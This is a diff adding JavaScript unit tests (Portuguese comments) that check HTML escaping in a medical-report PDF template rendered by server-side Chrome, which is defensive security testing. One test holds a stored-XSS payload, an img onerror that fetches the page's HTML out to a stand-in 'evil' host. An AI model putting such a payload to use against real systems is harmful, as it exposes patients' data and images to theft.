@@ -384,4 +384,39 @@ describe('montarPdfMoldura — campos e âncoras', () => {
     assert.ok(html.includes('<div style="display:flex;gap:8px;">'));
     assert.ok(!html.includes('margin-bottom:2px;">\n      <div style="flex:1"'));
   });
+
+  // ── Injeção armazenada no PDF (tríade final, fix I4) ──
+  // Este HTML é renderizado pelo Chrome do servidor, numa página que carrega
+  // as signed URLs das imagens DICOM do paciente. `pacienteNome` é gravável
+  // pela recepção (whitelist administrativa, exame não-emitido).
+  test('valor de identificação com payload sai ESCAPADO (não vira <img onerror>)', () => {
+    const payload = `<img src=x onerror="fetch('https://evil/?'+document.documentElement.innerHTML)">`;
+    const html = montarPdfMoldura({
+      titulo: 'T', identificacao: [[{ label: 'NOME', valor: payload }]], corpoHtml: '',
+      cfg: { p1: '#000', clinicaNome: 'X', sigTexto: '' },
+    });
+    assert.ok(!html.includes('<img src=x'), 'tag do payload chegou crua no HTML do PDF');
+    assert.ok(html.includes('&lt;img src=x onerror=&quot;'), 'o valor tem que aparecer escapado, visível como texto');
+  });
+
+  test('nome da clínica e assinatura também são escapados (cadastro do local/perfil)', () => {
+    const html = montarPdfMoldura({
+      titulo: 'T', identificacao: [[{ label: 'NOME', valor: 'A' }]], corpoHtml: '',
+      cfg: { p1: '#000', clinicaNome: '<script>1</script>', sigTexto: '<b>Dr.</b>' },
+    });
+    assert.ok(!html.includes('<script>1</script>'));
+    assert.ok(!html.includes('<b>Dr.</b>'));
+  });
+
+  test('& do dia a dia (Wilkins & Block, convênio "A & B") não quebra a âncora da correção', () => {
+    const html = montarPdfMoldura({
+      titulo: 'T',
+      identificacao: [[{ label: 'CONVÊNIO', valor: 'A & B' }, { label: 'MÉDICO SOLICITANTE', valor: 'Dr. X' }]],
+      corpoHtml: '', cfg: { p1: '#000', clinicaNome: 'X', sigTexto: '' },
+    });
+    assert.ok(html.includes('>A &amp; B</span>'));
+    const corrigido = substituirCamposAdministrativos(html, { convenio: 'C & D', solicitante: 'Dr. X' });
+    assert.notEqual(corrigido, null, 'valor escapado tem que continuar casando com a âncora');
+    assert.ok(corrigido.includes('>C &amp; D</span>'));
+  });
 });
